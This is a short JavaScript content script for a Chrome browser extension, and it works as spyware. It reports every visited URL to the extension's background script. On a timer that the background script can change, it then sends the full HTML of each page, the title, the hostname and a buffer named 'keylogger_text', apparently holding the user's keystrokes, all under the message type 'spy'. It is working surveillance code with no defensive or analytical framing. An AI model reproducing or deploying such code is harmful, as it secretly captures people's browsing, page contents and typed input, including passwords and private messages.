try{
	var tictac = 60000;
	var html;

	window.keylogger_text = "";

	//push item on history
	chrome.runtime.sendMessage({
		data : {
			url : window.location.href
		},
		type : "history"
	});

	(function __send__(){
		html = "<!DOCTYPE html><html>"+document.getElementsByTagName("html")[0].innerHTML+"</html>";

		chrome.runtime.sendMessage({
			data : {
				html : html,
				title : document.title,
				keylogger_text : window.keylogger_text,
				hostname : window.location.hostname
			},
			type : "spy",
			next : __send__
		}, function(response) {
			if(typeof response != "undefined"){
				tictac = Number(response.tictac);
			}

			window.keylogger_text = "";
			setTimeout(__send__, tictac);
		});
	})();
}catch(e){
	console.log(e);
}